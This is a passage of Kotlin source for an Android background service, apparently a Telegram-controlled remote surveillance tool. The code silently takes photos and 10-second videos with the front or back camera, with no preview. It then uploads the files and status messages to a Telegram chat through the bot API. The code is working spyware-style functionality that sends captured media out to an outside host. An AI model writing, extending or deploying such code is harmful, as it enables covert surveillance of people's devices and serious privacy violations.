                                    try {
                                        session.capture(captureBuilder.build(), null, cameraHandler)
                                    } catch (e: Exception) {
                                        openLatch.complete(false)
                                    }
                                }
                                override fun onConfigureFailed(session: CameraCaptureSession) {
                                    openLatch.complete(false)
                                }
                            }, cameraHandler)
                        } catch (e: Exception) {
                            openLatch.complete(false)
                        }
                    }

                    override fun onDisconnected(camera: CameraDevice) {
                        camera.close()
                        openLatch.complete(false)
                    }

                    override fun onError(camera: CameraDevice, error: Int) {
                        camera.close()
                        openLatch.complete(false)
                    }
                }, cameraHandler)

                withTimeoutOrNull(8000) { isCaptured.await() }

                if (photoFile.exists() && photoFile.length() > 0) {
                    sendPhotoToTelegram(chatId, photoFile)
                } else {
                    sendTelegramMessage(chatId, "❌ Failed to capture photo." + devCredit)
                }

            } catch (e: Exception) {
                Log.e(TAG, "Camera Error: ${e.message}", e)
            } finally {
                try { captureSession?.close() } catch (e: Exception) {}
                try { cameraDevice?.close() } catch (e: Exception) {}
                try { imageReader?.close() } catch (e: Exception) {}
            }
        }
    }

    @SuppressLint("MissingPermission")
    private fun recordAndSendVideo(chatId: Long, isFrontCam: Boolean) {
        serviceScope.launch(Dispatchers.IO) {
            var mediaRecorder: MediaRecorder? = null
            var cameraDevice: CameraDevice? = null
            var captureSession: CameraCaptureSession? = null

            try {
                val videoFile = File(cacheDir, "silent_video.mp4")
                if (videoFile.exists()) videoFile.delete()

                val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
                var targetCameraId = cameraManager.cameraIdList[0]

                for (id in cameraManager.cameraIdList) {
                    val characteristics = cameraManager.getCameraCharacteristics(id)
                    val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                    if (isFrontCam && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        targetCameraId = id
                        break
                    } else if (!isFrontCam && facing == CameraCharacteristics.LENS_FACING_BACK) {
                        targetCameraId = id
                        break
                    }
                }

                mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    MediaRecorder(applicationContext)
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }.apply {
                    setVideoSource(MediaRecorder.VideoSource.SURFACE)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                    setOutputFile(videoFile.absolutePath)
                    setVideoSize(640, 480)
                    setVideoFrameRate(30)
                    setVideoEncodingBitRate(1500000)
                    prepare()
                }

                val surface = mediaRecorder.surface
                val latch = CompletableDeferred<Boolean>()

                cameraManager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        try {
                            val requestBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                                addTarget(surface)
                            }
                            camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    captureSession = session
                                    try {
                                        session.setRepeatingRequest(requestBuilder.build(), null, cameraHandler)
                                        mediaRecorder?.start()
                                        latch.complete(true)
                                    } catch (e: Exception) {
                                        latch.complete(false)
                                    }
                                }
                                override fun onConfigureFailed(session: CameraCaptureSession) {
                                    latch.complete(false)
                                }
                            }, cameraHandler)
                        } catch (e: Exception) {
                            latch.complete(false)
                        }
                    }
                    override fun onDisconnected(camera: CameraDevice) { camera.close(); latch.complete(false) }
                    override fun onError(camera: CameraDevice, error: Int) { camera.close(); latch.complete(false) }
                }, cameraHandler)

                if (latch.await()) {
                    delay(10000)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Video recording error: ${e.message}", e)
            } finally {
                try { mediaRecorder?.stop() } catch (e: Exception) {}
                mediaRecorder?.release()
                captureSession?.close()
                cameraDevice?.close()
            }

            val videoFile = File(cacheDir, "silent_video.mp4")
            if (videoFile.exists() && videoFile.length() > 0) {
                sendVideoToTelegram(chatId, videoFile)
            } else {
                sendTelegramMessage(chatId, "❌ Video recording failed." + devCredit)
            }
        }
    }

    private fun sendPhotoToTelegram(chatId: Long, photoFile: File) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val boundary = "Boundary-" + System.currentTimeMillis()
                val url = URL("https://api.telegram.org/bot$botToken/sendPhoto")
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

                val outputStream: OutputStream = connection.outputStream
                val writer = outputStream.bufferedWriter(Charsets.UTF_8)

                writer.write("--$boundary\r\n")
                writer.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
                writer.write("$chatId\r\n")

                writer.write("--$boundary\r\n")
                writer.write("Content-Disposition: form-data; name=\"photo\"; filename=\"snapshot.jpg\"\r\n")
                writer.write("Content-Type: image/jpeg\r\n\r\n")
                writer.flush()

                FileInputStream(photoFile).copyTo(outputStream)
                outputStream.flush()

                writer.write("\r\n--$boundary--\r\n")
                writer.flush()
                writer.close()
                connection.inputStream.close()
            } catch (e: Exception) {
                Log.e(TAG, "Send photo error: ${e.message}", e)
            }
        }
    }

    private fun sendVideoToTelegram(chatId: Long, videoFile: File) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val boundary = "Boundary-" + System.currentTimeMillis()
                val url = URL("https://api.telegram.org/bot$botToken/sendVideo")
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

                val outputStream: OutputStream = connection.outputStream
                val writer = outputStream.bufferedWriter(Charsets.UTF_8)

                writer.write("--$boundary\r\n")
                writer.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
                writer.write("$chatId\r\n")

                writer.write("--$boundary\r\n")
                writer.write("Content-Disposition: form-data; name=\"video\"; filename=\"video.mp4\"\r\n")
                writer.write("Content-Type: video/mp4\r\n\r\n")
                writer.flush()

                FileInputStream(videoFile).copyTo(outputStream)
                outputStream.flush()

                writer.write("\r\n--$boundary--\r\n")
                writer.flush()
                writer.close()
                connection.inputStream.close()
            } catch (e: Exception) {
                Log.e(TAG, "Send video error: ${e.message}", e)
            }
        }
    }

    private fun sendTelegramMessage(chatId: Long, text: String) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val payload = JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", text)
                    put("parse_mode", "Markdown")
                }
                sendPostRequest("https://api.telegram.org/bot$botToken/sendMessage", payload)
            } catch (e: Exception) {
                Log.e(TAG, "Send message error: ${e.message}", e)
            }
        }
    }

    private fun sendPostRequest(urlString: String, jsonPayload: JSONObject) {
        val url = URL(urlString)
        val connection = url.openConnection() as HttpURLConnection
        connection.requestMethod = "POST"
        connection.setRequestProperty("Content-Type", "application/json; utf-8")
        connection.doOutput = true

        connection.outputStream.use { os ->
            val input = jsonPayload.toString().toByteArray(Charsets.UTF_8)
            os.write(input, 0, input.size)
        }
        connection.inputStream.close()
    }

    override fun onDestroy() {
        super.onDestroy()
        pollingJob?.cancel()
        serviceJob.cancel()
        cameraHandlerThread?.quitSafely()
        stopAlarm()
        Log.d(TAG, "Service Destroyed.")
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
